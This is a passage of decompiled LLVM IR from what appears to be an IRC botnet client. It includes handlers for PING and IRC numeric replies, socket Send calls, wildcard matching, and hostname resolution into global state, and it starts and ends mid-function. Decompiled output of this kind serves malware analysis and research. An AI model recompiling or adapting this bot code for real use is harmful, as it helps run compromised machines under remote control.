  %v3_96a8.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9660.dec_label_pc_9694_crit_edge ], [ %v1_9688, %dec_label_pc_9678 ]
  %v2_96a0.pre-phi = phi i32 [ %.pre27, %dec_label_pc_9660.dec_label_pc_9694_crit_edge ], [ %v2_9684, %dec_label_pc_9678 ]
  store i8 0, i8* %v3_96a8.pre-phi, align 1
  %v2_96b4 = load i32, i32* @global_var_30218.94, align 4
  store i32 %v1_9640, i32* %r0.global-to-local, align 4
  %v3_96c0 = call i32 @strwildmatch(i8* %v5_9644, i32 %v2_96b4)
  store i32 %v3_96c0, i32* %r0.global-to-local, align 4
  %v2_96c8 = icmp eq i32 %v3_96c0, 0
  br i1 %v2_96c8, label %dec_label_pc_96d0, label %dec_label_pc_9a30

dec_label_pc_96d0:                                ; preds = %dec_label_pc_9694
  %v1_96dc = add i32 %v2_96a0.pre-phi, 1
  %v5_96e0 = inttoptr i32 %v1_96dc to i8*
  store i32 %v1_96dc, i32* %r0.global-to-local, align 4
  %v3_96e8 = call i32 @strlen(i8* %v5_96e0)
  store i32 %v3_96e8, i32* %r0.global-to-local, align 4
  %v2_9738 = add i32 %v16_94ec, -1092
  br label %dec_label_pc_9760

dec_label_pc_9700:                                ; preds = %dec_label_pc_9760
  %v2_9704 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9708 = icmp eq i8 %v2_9704, 32
  br i1 %v7_9708, label %dec_label_pc_97b0, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9700
  %v2_9714 = load i8, i8* %stack_var_-32.0, align 1
  %v2_9718 = icmp eq i8 %v2_9714, 0
  br i1 %v2_9718, label %dec_label_pc_97b0, label %dec_label_pc_9720

dec_label_pc_9720:                                ; preds = %dec_label_pc_9710
  %v2_9728 = load i8, i8* %stack_var_-32.0, align 1
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_973c = add i32 %v2_9738, %storemerge14
  %v3_9744 = inttoptr i32 %v2_973c to i8*
  store i8 %v2_9728, i8* %v3_9744, align 1
  %v1_974c = add i32 %v4_9700, 1
  %v5_9750 = inttoptr i32 %v1_974c to i8*
  %v1_9758 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_9760

dec_label_pc_9760:                                ; preds = %dec_label_pc_96d0, %dec_label_pc_9720
  %stack_var_-32.0 = phi i8* [ %v5_96e0, %dec_label_pc_96d0 ], [ %v5_9750, %dec_label_pc_9720 ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_96d0 ], [ %v1_9758, %dec_label_pc_9720 ]
  %v5_976c = icmp slt i32 %storemerge14, %v3_96e8
  %v4_9700 = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v5_976c, label %dec_label_pc_9700, label %dec_label_pc_97b0

dec_label_pc_977c:                                ; preds = %dec_label_pc_97b0
  %v2_9788 = add i32 %storemerge15, %v4_9700
  %v1_978c = inttoptr i32 %v2_9788 to i8*
  %v2_978c = load i8, i8* %v1_978c, align 1
  %v7_9790 = icmp eq i8 %v2_978c, 32
  br i1 %v7_9790, label %dec_label_pc_9798, label %dec_label_pc_97a4

dec_label_pc_9798:                                ; preds = %dec_label_pc_977c
  %v1_979c = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_977c, %dec_label_pc_9798
  %stack_var_-28.0 = phi i32 [ %v1_979c, %dec_label_pc_9798 ], [ %stack_var_-28.1, %dec_label_pc_977c ]
  %v1_97a8 = add i32 %storemerge15, 1
  br label %dec_label_pc_97b0

dec_label_pc_97b0:                                ; preds = %dec_label_pc_9700, %dec_label_pc_9710, %dec_label_pc_9760, %dec_label_pc_97a4
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_97a4 ], [ 0, %dec_label_pc_9760 ], [ 0, %dec_label_pc_9710 ], [ 0, %dec_label_pc_9700 ]
  %storemerge15 = phi i32 [ %v1_97a8, %dec_label_pc_97a4 ], [ 0, %dec_label_pc_9760 ], [ 0, %dec_label_pc_9710 ], [ 0, %dec_label_pc_9700 ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_9700, i32* %r0.global-to-local, align 4
  %v3_97b8 = call i32 @strlen(i8* %stack_var_-32.0)
  store i32 %v3_97b8, i32* %r0.global-to-local, align 4
  %v0_97c0 = load i32, i32* @r4, align 4
  %v3_97c0 = icmp ult i32 %v0_97c0, %v3_97b8
  br i1 %v3_97c0, label %dec_label_pc_977c, label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_97b0
  %v1_97cc = add i32 %stack_var_-28.1, 1
  %v7_97dc = icmp slt i32 %v1_97cc, 11
  br i1 %v7_97dc, label %dec_label_pc_97e8, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97c8
  br label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97c8, %dec_label_pc_97e0
  %stack_var_-28.2 = phi i32 [ %v1_97cc, %dec_label_pc_97c8 ], [ 10, %dec_label_pc_97e0 ]
  %tmp74 = mul i32 %stack_var_-28.2, 4
  %v3_9800 = add i32 %tmp74, 4
  %v2_9808 = add i32 %v16_94ec, -68
  %v2_980c = add i32 %v2_9808, %v3_9800
  %v2_9814 = inttoptr i32 %v2_980c to i32*
  store i32 ptrtoint (i32* @global_var_1d1ac.96 to i32), i32* %v2_9814, align 4
  %v2_993c19 = load i8, i8* %stack_var_-32.0, align 1
  %v2_994021 = icmp eq i8 %v2_993c19, 0
  br i1 %v2_994021, label %dec_label_pc_9948, label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %dec_label_pc_97e8, %dec_label_pc_988c
  %v4_993823 = phi i32 [ %v2_9930.pre-phi, %dec_label_pc_988c ], [ %v4_9700, %dec_label_pc_97e8 ]
  %stack_var_-24.022 = phi i32 [ %v1_991c, %dec_label_pc_988c ], [ 1, %dec_label_pc_97e8 ]
  %v1_9828 = add i32 %v4_993823, 1
  %v5_982c = inttoptr i32 %v1_9828 to i8*
  %v6_983c = icmp slt i32 %stack_var_-24.022, %stack_var_-28.2
  br i1 %v6_983c, label %dec_label_pc_9858, label %dec_label_pc_9948

dec_label_pc_984c:                                ; preds = %dec_label_pc_9870
  %v1_9850 = add i32 %storemerge17, 1
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %dec_label_pc_9824, %dec_label_pc_984c
  %storemerge17 = phi i32 [ %v1_9850, %dec_label_pc_984c ], [ 0, %dec_label_pc_9824 ]
  store i32 %v1_9828, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @strlen(i8* %v5_982c)
  store i32 %v3_9860, i32* %r0.global-to-local, align 4
  %v3_9868 = icmp ult i32 %storemerge17, %v3_9860
  br i1 %v3_9868, label %dec_label_pc_9870, label %dec_label_pc_9858.dec_label_pc_988c_crit_edge

dec_label_pc_9858.dec_label_pc_988c_crit_edge:    ; preds = %dec_label_pc_9858
  %.pre30 = add i32 %storemerge17, %v1_9828
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_988c

dec_label_pc_9870:                                ; preds = %dec_label_pc_9858
  %v2_987c = add i32 %storemerge17, %v1_9828
  %v1_9880 = inttoptr i32 %v2_987c to i8*
  %v2_9880 = load i8, i8* %v1_9880, align 1
  %v7_9884 = icmp eq i8 %v2_9880, 32
  br i1 %v7_9884, label %dec_label_pc_988c, label %dec_label_pc_984c

dec_label_pc_988c:                                ; preds = %dec_label_pc_9870, %dec_label_pc_9858.dec_label_pc_988c_crit_edge
  %v5_9934.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9858.dec_label_pc_988c_crit_edge ], [ %v1_9880, %dec_label_pc_9870 ]
  %v2_9930.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9858.dec_label_pc_988c_crit_edge ], [ %v2_987c, %dec_label_pc_9870 ]
  store i32 %stack_var_-24.022, i32* @r4, align 4
  %v1_9894 = add i32 %storemerge17, 1
  store i32 %v1_9894, i32* %r0.global-to-local, align 4
  %v1_989c = call i32 @malloc(i32 %v1_9894)
  %v0_98ac = load i32, i32* @r4, align 4
  %v3_98ac = mul i32 %v0_98ac, 4
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_98b8 = add i32 %v2_9808, %v3_98ac
  %v2_98bc = inttoptr i32 %v2_98b8 to i32*
  store i32 %v1_989c, i32* %v2_98bc, align 4
  %v3_98c8 = mul i32 %stack_var_-24.022, 4
  %v2_98d4 = add i32 %v2_9808, %v3_98c8
  %v1_98d8 = inttoptr i32 %v2_98d4 to i32*
  %v2_98d8 = load i32, i32* %v1_98d8, align 4
  store i32 %v2_98d8, i32* %r0.global-to-local, align 4
  store i32 %v1_9828, i32* @r1, align 4
  %v3_98e8 = call i32 @strncpy(i32 %v2_98d8, i32 %v1_9828, i32 %storemerge17)
  store i32 %v16_94ec, i32* %r0.global-to-local, align 4
  %v2_9904 = load i32, i32* %v1_98d8, align 4
  %v2_990c = add i32 %v2_9904, %storemerge17
  %v3_9914 = inttoptr i32 %v2_990c to i8*
  store i8 0, i8* %v3_9914, align 1
  %v1_991c = add nuw i32 %stack_var_-24.022, 1
  %v2_993c = load i8, i8* %v5_9934.pre-phi, align 1
  %v2_9940 = icmp eq i8 %v2_993c, 0
  br i1 %v2_9940, label %dec_label_pc_9948, label %dec_label_pc_9824

dec_label_pc_9948:                                ; preds = %dec_label_pc_988c, %dec_label_pc_9824, %dec_label_pc_97e8
  %v7_9a24 = load i32, i32* bitcast ([5 x i8]** @global_var_27040.98 to i32*), align 4
  %v2_9a28 = icmp eq i32 %v7_9a24, 0
  br i1 %v2_9a28, label %dec_label_pc_9a30, label %dec_label_pc_9954

dec_label_pc_9954:                                ; preds = %dec_label_pc_9948
  store i32 %v7_9a24, i32* %r0.global-to-local, align 4
  %v2_9970 = inttoptr i32 %v7_9a24 to i8*
  %v3_9970 = call i32 @__GI_strcasecmp(i8* %v2_9970, i32 %v2_9620)
  store i32 %v3_9970, i32* %r0.global-to-local, align 4
  %v2_9998 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([5 x i8]** @global_var_27040.98 to i32), i32 4) to i32*), align 4
  store i32 %v2_9998, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 39360, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_9998)
  %v5_9a0865 = icmp sgt i32 %stack_var_-28.2, 1
  br i1 %v5_9a0865, label %dec_label_pc_99cc, label %dec_label_pc_9a30

dec_label_pc_99cc:                                ; preds = %dec_label_pc_9954, %dec_label_pc_99cc
  %storemerge1666 = phi i32 [ %v1_99f4, %dec_label_pc_99cc ], [ 1, %dec_label_pc_9954 ]
  %v3_99d4 = mul i32 %storemerge1666, 4
  %v2_99e0 = add i32 %v2_9808, %v3_99d4
  %v1_99e4 = inttoptr i32 %v2_99e0 to i32*
  %v2_99e4 = load i32, i32* %v1_99e4, align 4
  store i32 %v2_99e4, i32* @r0, align 4
  %v0_99ec = call i32 @free()
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge1666, 1
  %v5_9a08 = icmp slt i32 %v1_99f4, %stack_var_-28.2
  br i1 %v5_9a08, label %dec_label_pc_99cc, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9954, %dec_label_pc_99cc, %dec_label_pc_9948, %dec_label_pc_9694, %dec_label_pc_95fc, %dec_label_pc_95d4
  %v12_9a34 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_9a34

; uselistorder directives
  uselistorder i32 %v1_99f4, { 1, 0 }
  uselistorder i32 %v7_9a24, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_9828, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-24.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-28.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v4_9700, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %.pre27, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9640, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v4_9578, { 1, 0 }
  uselistorder i8* %v3_9568, { 1, 0 }
  uselistorder i8* %v3_953c, { 0, 2, 1 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i8* %v3_9520, { 1, 0 }
  uselistorder i32 %v16_94ec, { 2, 3, 0, 4, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-1124, { 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 24, 2, 1, 5, 3, 4, 6, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 20, 22, 21, 25, 23, 27, 26, 0 }
  uselistorder label %dec_label_pc_9a30, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_99cc, { 1, 0 }
  uselistorder label %dec_label_pc_9858, { 1, 0 }
  uselistorder label %dec_label_pc_9824, { 1, 0 }
  uselistorder label %dec_label_pc_97e8, { 1, 0 }
  uselistorder label %dec_label_pc_97b0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_97a4, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9660, { 1, 0 }
  uselistorder label %dec_label_pc_95a0, { 1, 0 }
  uselistorder label %dec_label_pc_951c, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39508, i32* %stack_var_-4, align 4
  %v2_9a50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a50, i32* @fp, align 4
  %v2_9a68 = load i32, i32* @global_var_30218.94, align 4
  %v4_9a78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1d1b0.101 to i32), i32 %v2_9a68)
  %v2_9a80 = load i32, i32* @global_var_30230.64, align 4
  %v4_9a94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1d1c0.106 to i32), i32 %v2_9a80)
  %v2_9a9c = load i32, i32* @global_var_30218.94, align 4
  %v4_9aac = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1d1d0.108 to i32), i32 %v2_9a9c)
  ret i32 %v4_9aac

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39644, i32* %stack_var_-4, align 4
  %v2_9ad8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ad8, i32* @fp, align 4
  %v4_9af8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1d1d8.110 to i32), i32 %arg3)
  ret i32 %v4_9af8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39700, i32* %stack_var_-4, align 4
  %v2_9b10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b10, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9b58.preheader

dec_label_pc_9b40:                                ; preds = %dec_label_pc_9b70
  %v1_9b44 = add i32 %.pre, 1
  %v5_9b48 = inttoptr i32 %v1_9b44 to i8*
  %v1_9b50 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9b58

dec_label_pc_9b58:                                ; preds = %dec_label_pc_9b58.preheader, %dec_label_pc_9b40
  %stack_var_-36.0 = phi i32 [ %v1_9b50, %dec_label_pc_9b40 ], [ %stack_var_-36.119, %dec_label_pc_9b58.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_9b48, %dec_label_pc_9b40 ], [ %stack_var_-28.120, %dec_label_pc_9b58.preheader ]
  %v3_9b5c = load i8*, i8** %stack_var_-52, align 4
  %v3_9b60 = call i32 @strlen(i8* %v3_9b5c)
  %v3_9b68 = icmp ult i32 %stack_var_-36.0, %v3_9b60
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_9b68, label %dec_label_pc_9b70, label %dec_label_pc_9b80

dec_label_pc_9b70:                                ; preds = %dec_label_pc_9b58
  %v2_9b74 = load i8, i8* %stack_var_-28.0, align 1
  %v7_9b78 = icmp eq i8 %v2_9b74, 32
  br i1 %v7_9b78, label %dec_label_pc_9b80, label %dec_label_pc_9b40

dec_label_pc_9b80:                                ; preds = %dec_label_pc_9b58, %dec_label_pc_9b70
  %v1_9b84 = add i32 %.pre, 1
  %v3_9b90 = load i8*, i8** %stack_var_-52, align 4
  %v3_9b94 = call i32 @strlen(i8* %v3_9b90)
  %v9_9b9c = icmp eq i32 %stack_var_-36.0, %v3_9b94
  br i1 %v9_9b9c, label %dec_label_pc_9e20, label %dec_label_pc_9ba4

dec_label_pc_9ba4:                                ; preds = %dec_label_pc_9b80
  %v5_9b88 = inttoptr i32 %v1_9b84 to i8*
  %v1_9ba8 = add nuw nsw i32 %storemerge921, 1
  %v7_9bb8 = icmp slt i32 %v1_9ba8, 5
  br i1 %v7_9bb8, label %dec_label_pc_9b58.preheader, label %dec_label_pc_9bd4

dec_label_pc_9b58.preheader:                      ; preds = %entry, %dec_label_pc_9ba4
  %storemerge921 = phi i32 [ 0, %entry ], [ %v1_9ba8, %dec_label_pc_9ba4 ]
  %stack_var_-28.120 = phi i8* [ %arg3, %entry ], [ %v5_9b88, %dec_label_pc_9ba4 ]
  %stack_var_-36.119 = phi i32 [ 0, %entry ], [ %stack_var_-36.0, %dec_label_pc_9ba4 ]
  br label %dec_label_pc_9b58

dec_label_pc_9bc8:                                ; preds = %dec_label_pc_9bec
  %v1_9bcc = add i32 %storemerge10, 1
  br label %dec_label_pc_9bd4

dec_label_pc_9bd4:                                ; preds = %dec_label_pc_9ba4, %dec_label_pc_9bc8
  %storemerge10 = phi i32 [ %v1_9bcc, %dec_label_pc_9bc8 ], [ 0, %dec_label_pc_9ba4 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_9bdc = call i32 @strlen(i8* %v5_9b88)
  %v0_9be4 = load i32, i32* @r4, align 4
  %v3_9be4 = icmp ult i32 %v0_9be4, %v3_9bdc
  br i1 %v3_9be4, label %dec_label_pc_9bec, label %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge

dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge:    ; preds = %dec_label_pc_9bd4
  %.pre27 = add i32 %storemerge10, %v1_9b84
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9c08

dec_label_pc_9bec:                                ; preds = %dec_label_pc_9bd4
  %v2_9bf8 = add i32 %storemerge10, %v1_9b84
  %v1_9bfc = inttoptr i32 %v2_9bf8 to i8*
  %v2_9bfc = load i8, i8* %v1_9bfc, align 1
  %v7_9c00 = icmp eq i8 %v2_9bfc, 32
  br i1 %v7_9c00, label %dec_label_pc_9c08, label %dec_label_pc_9bc8

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9bec, %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge
  %v3_9c1c.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9bd4.dec_label_pc_9c08_crit_edge ], [ %v1_9bfc, %dec_label_pc_9bec ]
  store i8 0, i8* %v3_9c1c.pre-phi, align 1
  %v2_9c24 = load i32, i32* @global_var_30218.94, align 4
  %v4_9c30 = call i32 @__GI_strcasecmp(i8* %v5_9b88, i32 %v2_9c24)
  %v2_9c38 = icmp eq i32 %v4_9c30, 0
  br i1 %v2_9c38, label %dec_label_pc_9c40, label %dec_label_pc_9e20

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9c08
  %v2_9c44 = load i32, i32* @global_var_2b904.113, align 4
  %v2_9c48 = icmp eq i32 %v2_9c44, 0
  br i1 %v2_9c48, label %dec_label_pc_9c50, label %dec_label_pc_9e20

dec_label_pc_9c50:                                ; preds = %dec_label_pc_9c40
  %v3_9c50 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_9c84.preheader

dec_label_pc_9c6c:                                ; preds = %dec_label_pc_9c9c
  %v1_9c70 = add i32 %.pre29, 1
  %v5_9c74 = inttoptr i32 %v1_9c70 to i8*
  %v1_9c7c = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_9c84

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9c84.preheader, %dec_label_pc_9c6c
  %stack_var_-36.2 = phi i32 [ %v1_9c7c, %dec_label_pc_9c6c ], [ %stack_var_-36.316, %dec_label_pc_9c84.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_9c74, %dec_label_pc_9c6c ], [ %stack_var_-28.317, %dec_label_pc_9c84.preheader ]
  %v3_9c88 = load i8*, i8** %stack_var_-52, align 4
  %v3_9c8c = call i32 @strlen(i8* %v3_9c88)
  %v3_9c94 = icmp ult i32 %stack_var_-36.2, %v3_9c8c
  %.pre29 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_9c94, label %dec_label_pc_9c9c, label %dec_label_pc_9cac

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9c84
  %v2_9ca0 = load i8, i8* %stack_var_-28.2, align 1
  %v7_9ca4 = icmp eq i8 %v2_9ca0, 32
  br i1 %v7_9ca4, label %dec_label_pc_9cac, label %dec_label_pc_9c6c

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c84, %dec_label_pc_9c9c
  %v1_9cb0 = add i32 %.pre29, 1
  %v3_9cbc = load i8*, i8** %stack_var_-52, align 4
  %v3_9cc0 = call i32 @strlen(i8* %v3_9cbc)
  %v9_9cc8 = icmp eq i32 %stack_var_-36.2, %v3_9cc0
  br i1 %v9_9cc8, label %dec_label_pc_9e20, label %dec_label_pc_9cd0

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9cac
  %v5_9cb4 = inttoptr i32 %v1_9cb0 to i8*
  %v1_9cd4 = add nuw nsw i32 %storemerge1118, 1
  %v7_9ce4 = icmp slt i32 %v1_9cd4, 3
  br i1 %v7_9ce4, label %dec_label_pc_9c84.preheader, label %dec_label_pc_9d00

dec_label_pc_9c84.preheader:                      ; preds = %dec_label_pc_9c50, %dec_label_pc_9cd0
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_9c50 ], [ %v1_9cd4, %dec_label_pc_9cd0 ]
  %stack_var_-28.317 = phi i8* [ %v3_9c50, %dec_label_pc_9c50 ], [ %v5_9cb4, %dec_label_pc_9cd0 ]
  %stack_var_-36.316 = phi i32 [ 0, %dec_label_pc_9c50 ], [ %stack_var_-36.2, %dec_label_pc_9cd0 ]
  br label %dec_label_pc_9c84

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9d18
  %v1_9cf8 = add i32 %storemerge12, 1
  br label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cd0, %dec_label_pc_9cf4
  %storemerge12 = phi i32 [ %v1_9cf8, %dec_label_pc_9cf4 ], [ 0, %dec_label_pc_9cd0 ]
  store i32 %storemerge12, i32* @r4, align 4
  %v3_9d08 = call i32 @strlen(i8* %v5_9cb4)
  %v0_9d10 = load i32, i32* @r4, align 4
  %v3_9d10 = icmp ult i32 %v0_9d10, %v3_9d08
  br i1 %v3_9d10, label %dec_label_pc_9d18, label %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge

dec_label_pc_9d00.dec_label_pc_9d34_crit_edge:    ; preds = %dec_label_pc_9d00
  %.pre30 = add i32 %storemerge12, %v1_9cb0
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_9d34

dec_label_pc_9d18:                                ; preds = %dec_label_pc_9d00
  %v2_9d24 = add i32 %storemerge12, %v1_9cb0
  %v1_9d28 = inttoptr i32 %v2_9d24 to i8*
  %v2_9d28 = load i8, i8* %v1_9d28, align 1
  %v7_9d2c = icmp eq i8 %v2_9d28, 32
  br i1 %v7_9d2c, label %dec_label_pc_9d34, label %dec_label_pc_9cf4

dec_label_pc_9d34:                                ; preds = %dec_label_pc_9d18, %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge
  %v3_9d48.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9d00.dec_label_pc_9d34_crit_edge ], [ %v1_9d28, %dec_label_pc_9d18 ]
  store i8 0, i8* %v3_9d48.pre-phi, align 1
  store i32 %v1_9cb0, i32* @r0, align 4
  %v2_9d50 = call i32 @inet_addr(i32 %v1_9cb0)
  %v5_9d58 = trunc i32 %v2_9d50 to i8
  store i8 %v5_9d58, i8* %stack_var_-40, align 1
  %v3_9d60 = icmp eq i8 %v5_9d58, -1
  br i1 %v3_9d60, label %dec_label_pc_9d68, label %dec_label_pc_9dc4

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9d34
  %v2_9d6c = call i32 @__GI_gethostbyname(i32 %v1_9cb0)
  %v2_9d7c = icmp eq i32 %v2_9d6c, 0
  br i1 %v2_9d7c, label %dec_label_pc_9d84, label %dec_label_pc_9da0

dec_label_pc_9d84:                                ; preds = %dec_label_pc_9d68
  %v2_9d88 = load i32, i32* @global_var_30230.64, align 4
  %v4_9d98 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1d1e4.116 to i32), i32 %v2_9d88)
  br label %dec_label_pc_9e20

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9d68
  %v2_9da0 = ptrtoint i8* %stack_var_-40 to i32
  %v1_9da8 = add i32 %v2_9d6c, 16
  %v2_9da8 = inttoptr i32 %v1_9da8 to i32*
  %v3_9da8 = load i32, i32* %v2_9da8, align 4
  %v1_9dac = inttoptr i32 %v3_9da8 to i32*
  %v2_9dac = load i32, i32* %v1_9dac, align 4
  store i32 %v2_9dac, i32* @r1, align 4
  %v1_9db4 = add i32 %v2_9d6c, 12
  %v2_9db4 = inttoptr i32 %v1_9db4 to i32*
  %v3_9db4 = load i32, i32* %v2_9db4, align 4
  store i32 %v2_9da0, i32* @r0, align 4
  store i32 %v3_9db4, i32* @r2, align 4
  %v0_9dc0 = call i32 @memcpy()
  %v2_9dd0.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9d34, %dec_label_pc_9da0
  %v12_9e2426 = phi i32 [ %v0_9dc0, %dec_label_pc_9da0 ], [ %v2_9d50, %dec_label_pc_9d34 ]
  %v2_9dd0 = phi i8 [ %v2_9dd0.pre, %dec_label_pc_9da0 ], [ %v5_9d58, %dec_label_pc_9d34 ]
  store i8 %v2_9dd0, i8* bitcast (i8** @global_var_2b903.119 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_2b900.118 to i8*), align 4
  store i32 256, i32* @global_var_2b904.113, align 4
  br label %dec_label_pc_9e20

dec_label_pc_9e20:                                ; preds = %dec_label_pc_9b80, %dec_label_pc_9cac, %dec_label_pc_9c40, %dec_label_pc_9c08, %dec_label_pc_9d84, %dec_label_pc_9dc4
  %v12_9e24 = phi i32 [ 0, %dec_label_pc_9c40 ], [ %v4_9c30, %dec_label_pc_9c08 ], [ %v4_9d98, %dec_label_pc_9d84 ], [ %v12_9e2426, %dec_label_pc_9dc4 ], [ %v3_9cc0, %dec_label_pc_9cac ], [ %v3_9b94, %dec_label_pc_9b80 ]
  ret i32 %v12_9e24

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9cd4, { 1, 0 }
  uselistorder i32 %v1_9cb0, { 2, 4, 3, 0, 1, 5 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9ba8, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9e20, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9dc4, { 1, 0 }
  uselistorder label %dec_label_pc_9d00, { 1, 0 }
  uselistorder label %dec_label_pc_9c84.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9cac, { 1, 0 }
  uselistorder label %dec_label_pc_9bd4, { 1, 0 }
  uselistorder label %dec_label_pc_9b58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9b80, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40520, i32* %stack_var_-4, align 4
